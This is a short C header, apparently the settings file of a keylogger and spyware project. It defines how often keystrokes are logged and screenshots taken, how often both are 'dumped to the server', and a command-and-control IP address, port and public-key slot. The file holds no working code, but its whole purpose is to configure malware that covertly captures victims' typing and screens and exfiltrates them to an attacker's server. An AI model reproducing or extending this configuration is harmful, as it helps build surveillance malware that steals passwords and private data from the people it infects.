#ifndef SETTINGS_H
#define SETTINGS_H

/**
 * Name of the master log
 **/
#define MASTER_LOG_NAME "ml"

/**
 * How often the keylog is written in minutes
 **/
#define LOG_FREQUENCY_MINUTES 2

/**
 * How often the keylog and screenshots are 
 * dumped to the server in minutes
 */
#define DUMP_FREQUENCY_MINUTES 60

/**
 * How often screenshots are recorded in minutes
 */
#define SS_FREQUENCY_MINUTES 0.5

/**
 * Comand and Control ip and port
 **/
#define CC_HOSTNAME "192.168.1.252"
#define CC_PORT 3008

/**
 * Public key of cc server
 **/
#define CC_PUBLIC_KEY ""

#endif
